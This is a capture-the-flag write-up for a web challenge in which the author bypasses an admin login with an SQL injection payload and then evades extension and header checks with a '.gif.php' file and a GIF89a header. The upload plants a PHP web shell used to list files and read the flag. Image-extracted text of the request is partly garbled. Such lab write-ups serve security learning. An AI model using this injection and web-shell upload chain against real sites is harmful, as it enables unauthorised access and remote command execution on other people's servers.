# Dumb Admin
> The Admin coded his dashboard by himself. He's sure to be a pro coder and he's so satisfied about it. Can you make him rethink that?

## About the Challenge
We were given a website that contain an admin panel, looks like we need to bypass the panel


[Image extracted text: DumbAdmin
Home
Dashboard
Login in Administration
Username
Password
Login
panel]


## How to Solve?
First we need to bypass the admin panel by using SQL injection payload, here is the payload I used

```
Username: admin' or true-- -
Password: testtttttttttttttt
```

After that we will see find a file upload functionaility where we can upload an image there


[Image extracted text: DumbAdmin
Home
Dashboard
Admin Dashboard
Hello Admin! Here you can upload your files
Choose a JPEG to upload (max 2KB):
Browse .
No file selected 
Upload File]


We need to do `Remote Code Execution` by uploading a malicious PHP file. But there is some filter, the website will check the extension of the file, and the header of the file. But we can bypass it by using `.gif.php` extension and add `GIF89A` as a file header


[Image extracted text: Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
POST
/ dashboard
php
HTTP / =
HTTP/2
200
Host
dubaduin
challs
dantect €
Dace;
Tue
J
2023
00:28331
GHT
Cookin
PHPSESSID=03f8661daec526f5 felOdd98de8065af
Cont ent
Type
cext/htnl
charset-UTF-8
User-Agent
Hozilla/5
(Vindovs
IT
10_
0; Vin64;
364;
rv: 109
Gecko/-O1OO101
Content
Length:
1871
Firefox/ll3
X-Pouered-By:
PHP / 7
Lccept
Expires:
Thu
Mov
1981
083 52- 00
GIIT
cext/htnl
applicat
on / *hcnltxul
applicat_
on/xnl
9-0
image
avi
inage /vebp
M{TO_
Cache-Control
store
n10 -
cache
hust-revalidate
Lccept
Language-
En=
US
en ;
Pracna:
no-cache
Accept
Encoding:
gzip,
deflace
Hagic-Funct
on-Used-By-The-
age :
exif
inagetype
Content
Type-
nultipart / forn-data;
10 Vary:
1ccept
Encoding
boundary=
31567875806823717061426544523
Scrict
Transport-Security:
HAa
age-15724800;
includeSubDomains
Content
engch:
273
10
Origin:
https
1 [dubaduin
challs
dancect f
The image
f209934239125624f98642d147--926 fb
Sif
php
has
been uploaded!
~pI>
Referer:
https: / / dubaduin
challs
dantect f
it / dashboard-php
fou
can
vied
here:
href=
12
Upgrade-Ins
cure-
Requests:
imageVieuer-php? filenane=fe0993449125624f98b4edld7ee926fb
php
Sec-Fetch-Dest
docuent
Click
here
14
Sec-Fetch-Hode
navigate
15
Sec-Fetch-Sice
sae
origin
16
Sec-Fetch-User:
2 1
Te:
crailers
31567875806823717061426544523
20
Cont
Disposit_
form-daca;
nale=
fileUploaded
filenae=
Gest
Jif-php
Content
Type:
applicat
on ( php
22
GIF891;
<php systen ( ?
GET [
cnd' ] ;
2 4
31567875808823717061426544523--
25
Seorcn;
matches
Seorcne
matches
470 -
J1 f
enc
on ;]


Now we need to access `/imageViewer.php?filename=fe0993aa9125624f98b4cd1d7ee926fb.gif.php` to obtain the full path where we can access the file that we have uploaded before


[Image extracted text: 6 -
C
8
https:/ /dumbadmin challs dantectfit /f9bbbecb61014db8f0674bf60c27e668/fe0993aa9125624f98b4cd1d7ee926fb.gif php?cmd=Is
GIF89A; d47709c7acf08409dd9412fd59bd4469.gif d527b6ff4aec9698e4f827e484d3402a.gif fe0993aa9125624f98b4cdld7ee926fb.gif-php]


The flag was located in the `/` directory


[Image extracted text: ~ 7
https:/ /dumbadmin challs dantectfit fgbbbecb61014db8f0674bf60c27e668/fe0993aa9125624f98b4cd1d7ee926fb.gif php?cmd=cat /flag txt
GIFS9A; DANTE {YOu_KnOw_how_tO_bypass_things_
PhP9Abd7BdCFF}]


```
DANTE{Y0u_Kn0w_how_t0_bypass_things_in_PhP9Abd7BdCFF}
```